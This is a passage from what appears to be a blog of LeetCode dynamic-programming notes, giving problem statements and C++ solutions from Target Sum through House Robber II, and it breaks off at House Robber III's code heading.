<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) sum += nums[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(S) &gt; sum) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 此时没有方案</span></span><br><span class="line">        <span class="keyword">if</span> ((S + sum) % <span class="number">2</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 此时没有方案</span></span><br><span class="line">        <span class="keyword">int</span> bagSize = (S + sum) / <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(bagSize + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = bagSize; j &gt;= nums[i]; j--) &#123;</span><br><span class="line">                dp[j] += dp[j - nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[bagSize];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="474-Ones-and-Zeroes"><a href="#474-Ones-and-Zeroes" class="headerlink" title="* 474. Ones and Zeroes"></a>* 474. Ones and Zeroes</h3><p><strong>Description:</strong></p>
<p>You are given an array of binary strings <code>strs</code> and two integers <code>m</code> and <code>n</code>.</p>
<p>Return <em>the size of the largest subset of <code>strs</code> such that there are <strong>at most</strong></em> <code>m</code> <code>0</code><em>‘s and</em> <code>n</code> <code>1</code><em>‘s in the subset</em>.</p>
<p>A set <code>x</code> is a <strong>subset</strong> of a set <code>y</code> if all elements of <code>x</code> are also elements of <code>y</code>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: strs = [&quot;10&quot;,&quot;0001&quot;,&quot;111001&quot;,&quot;1&quot;,&quot;0&quot;], m = 5, n = 3</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: The largest subset with at most 5 0&#x27;s and 3 1&#x27;s is &#123;&quot;10&quot;, &quot;0001&quot;, &quot;1&quot;, &quot;0&quot;&#125;, so the answer is 4.</span><br><span class="line">Other valid but smaller subsets include &#123;&quot;0001&quot;, &quot;1&quot;&#125; and &#123;&quot;10&quot;, &quot;1&quot;, &quot;0&quot;&#125;.</span><br><span class="line">&#123;&quot;111001&quot;&#125; is an invalid subset because it contains 4 1&#x27;s, greater than the maximum of 3.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: strs = [&quot;10&quot;,&quot;0&quot;,&quot;1&quot;], m = 1, n = 1</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The largest subset is &#123;&quot;0&quot;, &quot;1&quot;&#125;, so the answer is 2.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= strs.length &lt;= 600</code></li>
<li><code>1 &lt;= strs[i].length &lt;= 100</code></li>
<li><code>strs[i]</code> consists only of digits <code>&#39;0&#39;</code> and <code>&#39;1&#39;</code>.</li>
<li><code>1 &lt;= m, n &lt;= 100</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt; (n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> str : strs) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum1 = <span class="number">0</span>, sum0 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> c : str) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span>)   sum0++;</span><br><span class="line">                <span class="keyword">else</span>    sum1++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = m; i &gt;= sum0; i--) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &gt;= sum1; j--) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j], dp[i-sum0][j-sum1] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="518-Coin-Change-II"><a href="#518-Coin-Change-II" class="headerlink" title="518. Coin Change II"></a>518. Coin Change II</h3><p><strong>Description:</strong></p>
<p>You are given an integer array <code>coins</code> representing coins of different denominations and an integer <code>amount</code> representing a total amount of money.</p>
<p>Return <em>the number of combinations that make up that amount</em>. If that amount of money cannot be made up by any combination of the coins, return <code>0</code>.</p>
<p>You may assume that you have an infinite number of each kind of coin.</p>
<p>The answer is <strong>guaranteed</strong> to fit into a signed <strong>32-bit</strong> integer.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: amount = 5, coins = [1,2,5]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: there are four ways to make up the amount:</span><br><span class="line">5=5</span><br><span class="line">5=2+2+1</span><br><span class="line">5=2+1+1+1</span><br><span class="line">5=1+1+1+1+1</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: amount = 3, coins = [2]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: the amount of 3 cannot be made up just with coins of 2.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: amount = 10, coins = [10]</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p> <strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= coins.length &lt;= 300</code></li>
<li><code>1 &lt;= coins[i] &lt;= 5000</code></li>
<li>All the values of <code>coins</code> are <strong>unique</strong>.</li>
<li><code>0 &lt;= amount &lt;= 5000</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, vector&lt;<span class="keyword">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i : coins) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt;= amount; j++) &#123;</span><br><span class="line">                dp[j] += dp[j-i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="377-Combination-Sum-IV"><a href="#377-Combination-Sum-IV" class="headerlink" title="377. Combination Sum IV"></a>377. Combination Sum IV</h3><p><strong>Description:</strong></p>
<p>Given an array of <strong>distinct</strong> integers <code>nums</code> and a target integer <code>target</code>, return <em>the number of possible combinations that add up to</em> <code>target</code>.</p>
<p>The test cases are generated so that the answer can fit in a <strong>32-bit</strong> integer.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3], target = 4</span><br><span class="line">Output: 7</span><br><span class="line">Explanation:</span><br><span class="line">The possible combination ways are:</span><br><span class="line">(1, 1, 1, 1)</span><br><span class="line">(1, 1, 2)</span><br><span class="line">(1, 2, 1)</span><br><span class="line">(1, 3)</span><br><span class="line">(2, 1, 1)</span><br><span class="line">(2, 2)</span><br><span class="line">(3, 1)</span><br><span class="line">Note that different sequences are counted as different combinations.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [9], target = 3</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 200</code></li>
<li><code>1 &lt;= nums[i] &lt;= 1000</code></li>
<li>All the elements of <code>nums</code> are <strong>unique</strong>.</li>
<li><code>1 &lt;= target &lt;= 1000</code></li>
</ul>
<p><strong>Follow up:</strong> What if negative numbers are allowed in the given array? How does it change the problem? What limitation we need to add to the question to allow negative numbers?</p>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">combinationSum4</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= target; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i - nums[j] &gt;= <span class="number">0</span> &amp;&amp; dp[i] &lt; INT_MAX - dp[i - nums[j]]) &#123;</span><br><span class="line">                    dp[i] += dp[i - nums[j]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="322-Coin-Change"><a href="#322-Coin-Change" class="headerlink" title="322. Coin Change"></a>322. Coin Change</h3><p><strong>Description:</strong></p>
<p>You are given an integer array <code>coins</code> representing coins of different denominations and an integer <code>amount</code> representing a total amount of money.</p>
<p>Return <em>the fewest number of coins that you need to make up that amount</em>. If that amount of money cannot be made up by any combination of the coins, return <code>-1</code>.</p>
<p>You may assume that you have an infinite number of each kind of coin.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: coins = [1,2,5], amount = 11</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: 11 = 5 + 5 + 1</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: coins = [2], amount = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: coins = [1], amount = 0</span><br><span class="line">Output: 0 </span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= coins.length &lt;= 12</code></li>
<li><code>1 &lt;= coins[i] &lt;= 231 - 1</code></li>
<li><code>0 &lt;= amount &lt;= 104</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">10001</span>, <span class="number">0xffff</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= amount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; coins.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; coins[j]) <span class="keyword">continue</span>;</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i-coins[j]]+<span class="number">1</span>, dp[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[amount] == <span class="number">0xffff</span>)   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="279-Perfect-Squares"><a href="#279-Perfect-Squares" class="headerlink" title="279. Perfect Squares"></a>279. Perfect Squares</h3><p><strong>Description:</strong></p>
<p>Given an integer <code>n</code>, return <em>the least number of perfect square numbers that sum to</em> <code>n</code>.</p>
<p>A <strong>perfect square</strong> is an integer that is the square of an integer; in other words, it is the product of some integer with itself. For example, <code>1</code>, <code>4</code>, <code>9</code>, and <code>16</code> are perfect squares while <code>3</code> and <code>11</code> are not.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 12</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: 12 = 4 + 4 + 4.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: n = 13</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 13 = 4 + 9.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 104</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; num;</span><br><span class="line">        <span class="keyword">int</span> cur = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur*cur &lt;= n) &#123;</span><br><span class="line">            num.<span class="built_in">push_back</span>(cur*cur);</span><br><span class="line">            cur++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="number">0xffff</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; num.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; num[j]) <span class="keyword">continue</span>;</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i-num[j]]+<span class="number">1</span>, dp[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[n] == <span class="number">0xffff</span>)    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="139-Word-Break"><a href="#139-Word-Break" class="headerlink" title="* 139. Word Break"></a>* 139. Word Break</h3><p><strong>Description:</strong></p>
<p>Given a string <code>s</code> and a dictionary of strings <code>wordDict</code>, return <code>true</code> if <code>s</code> can be segmented into a space-separated sequence of one or more dictionary words.</p>
<p><strong>Note</strong> that the same word in the dictionary may be reused multiple times in the segmentation.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;,&quot;code&quot;]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Return true because &quot;leetcode&quot; can be segmented as &quot;leet code&quot;.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;applepenapple&quot;, wordDict = [&quot;apple&quot;,&quot;pen&quot;]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Return true because &quot;applepenapple&quot; can be segmented as &quot;apple pen apple&quot;.</span><br><span class="line">Note that you are allowed to reuse a dictionary word.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;,&quot;dog&quot;,&quot;sand&quot;,&quot;and&quot;,&quot;cat&quot;]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 300</code></li>
<li><code>1 &lt;= wordDict.length &lt;= 1000</code></li>
<li><code>1 &lt;= wordDict[i].length &lt;= 20</code></li>
<li><code>s</code> and <code>wordDict[i]</code> consist of only lowercase English letters.</li>
<li>All the strings of <code>wordDict</code> are <strong>unique</strong>.</li>
</ul>
<p><strong>code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_set&lt;string&gt; <span class="title">wordSet</span><span class="params">(wordDict.begin(), wordDict.end())</span></span>;        <span class="comment">//先把vector类型转化为unordered_set类型！</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">bool</span>&gt; <span class="title">dp</span><span class="params">(s.size()+<span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                string word = s.<span class="built_in">substr</span>(j, i-j);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.<span class="built_in">find</span>(word) != wordSet.<span class="built_in">end</span>() &amp;&amp; dp[j]) &#123;</span><br><span class="line">                    dp[i] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.<span class="built_in">size</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="198-House-Robber"><a href="#198-House-Robber" class="headerlink" title="* 198. House Robber"></a>* 198. House Robber</h3><p><strong>Desription:</strong></p>
<p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security systems connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p>
<p>Given an integer array <code>nums</code> representing the amount of money of each house, return <em>the maximum amount of money you can rob tonight <strong>without alerting the police</strong></em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).</span><br><span class="line">Total amount you can rob = 1 + 3 = 4.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [2,7,9,3,1]</span><br><span class="line">Output: 12</span><br><span class="line">Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1).</span><br><span class="line">Total amount you can rob = 2 + 9 + 1 = 12.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>0 &lt;= nums[i] &lt;= 400</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size()+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() &lt;= <span class="number">1</span>)   <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="built_in">max</span>(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i<span class="number">-2</span>; j++) &#123;</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>], dp[j]+nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[nums.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="213-House-Robber-II"><a href="#213-House-Robber-II" class="headerlink" title="* 213. House Robber II"></a>* 213. House Robber II</h3><p><strong>Description:</strong></p>
<p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are <strong>arranged in a circle.</strong> That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have a security system connected, and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p>
<p>Given an integer array <code>nums</code> representing the amount of money of each house, return <em>the maximum amount of money you can rob tonight <strong>without alerting the police</strong></em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [2,3,2]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2), because they are adjacent houses.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).</span><br><span class="line">Total amount you can rob = 1 + 3 = 4.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>0 &lt;= nums[i] &lt;= 1000</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp1</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">1</span>)   <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//分三种情况，不考虑首尾、不考虑尾，不考虑首，后两者包含第一种情况</span></span><br><span class="line">        <span class="keyword">int</span> res1 = <span class="built_in">get_max</span>(<span class="number">0</span>, len<span class="number">-2</span>, nums);</span><br><span class="line">        <span class="keyword">int</span> res2 = <span class="built_in">get_max</span>(<span class="number">1</span>, len<span class="number">-1</span>, nums);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(res1, res2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get_max</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> end, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start == end)   <span class="keyword">return</span> nums[start];</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size())</span></span>;</span><br><span class="line">        dp[start] = nums[start];</span><br><span class="line">        dp[start+<span class="number">1</span>] = <span class="built_in">max</span>(nums[start], nums[start+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start+<span class="number">2</span>; i &lt;= end; i++) &#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-2</span>]+nums[i], dp[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[end];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="337-House-Robber-III"><a href="#337-House-Robber-III" class="headerlink" title="337. * House Robber III"></a>337. * House Robber III</h3><p><strong>Description:</strong></p>
<p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called <code>root</code>.</p>
<p>Besides the <code>root</code>, each house has one and only one parent house. After a tour, the smart thief realized that all houses in this place form a binary tree. It will automatically contact the police if <strong>two directly-linked houses were broken into on the same night</strong>.</p>
<p>Given the <code>root</code> of the binary tree, return <em>the maximum amount of money the thief can rob <strong>without alerting the police</strong></em>.</p>
<p><strong>Example 1:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2021/03/10/rob1-tree.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: root = [3,2,3,null,3,null,1]</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2021/03/10/rob2-tree.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: root = [3,4,5,1,3,null,1]</span><br><span class="line">Output: 9</span><br><span class="line">Explanation: Maximum amount of money the thief can rob = 4 + 5 = 9.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li>The number of nodes in the tree is in the range <code>[1, 104]</code>.</li>
<li><code>0 &lt;= Node.val &lt;= 104</code></li>
</ul>
<p><strong>Code:</strong></p>
